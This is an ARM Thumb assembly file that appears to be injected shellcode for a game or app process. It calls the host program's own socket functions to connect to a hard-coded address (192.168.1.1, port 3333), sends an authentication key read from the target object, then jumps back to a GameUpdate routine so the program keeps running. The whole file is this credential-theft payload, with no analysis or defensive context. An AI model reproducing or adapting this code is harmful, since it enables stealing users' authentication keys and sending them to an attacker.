.section .text
.thumb
.global start

start:
	@ r4 = this
	ldr	r0, [r4, #0]	@ load api

	ldr	r3, [r0, #0]	@ load api vtable
	ldr	r5, [r3, #48]	@ load socket() function
	movs	r1, #1
	blx	r5		@ call socket(true)
	mov	r7, r0

@	ldr	r1, =string
@	ldr	r5, [r3, #40]	@ load aton()

	ldr     r5, [r3, #64]   @ load connect()
	ldr     r0, [r4, #0]    @ load api
	mov	r1, r7		@ socket
	sub	sp, #8		@ allocate space for NetAddr
	ldr	r6, =0x0100A8C0	@ r6 = ip address
	str	r6, [sp, #0]	@ store ip to NetAddr
	ldr	r6, =3333	@ r6 = port
	strh	r6, [sp, #4]	@ store port to NetAddr
	mov	r2, sp
	blx	r5

	ldr     r5, [r3, #56]   @ load send()
	ldr     r0, [r4, #0]    @ load api
	mov	r1, r7		@ socket
	ldr     r6, [r4, #20]   @ load auth key
	str	r6, [sp, #0]	@ store auth key on stack
	mov	r2, sp
	mov	r3, #4
	@ 4th argument ?
	blx	r5

	ldr     r5, [r3, #84]   @ load close()
	ldr     r0, [r4, #0]    @ load api
	mov     r1, r7          @ socket
	blx	r5

	add	sp, #8
	sub 	r4, #252 	@ restore previous this
	mov	r5, #0x0000	@ GameUpdate Addr
	ldr	r6, =0xbfa
	add	r5, r6
	mov 	pc, r5

@ .section .rodata
@ string: .asciz "192.168.1.1"

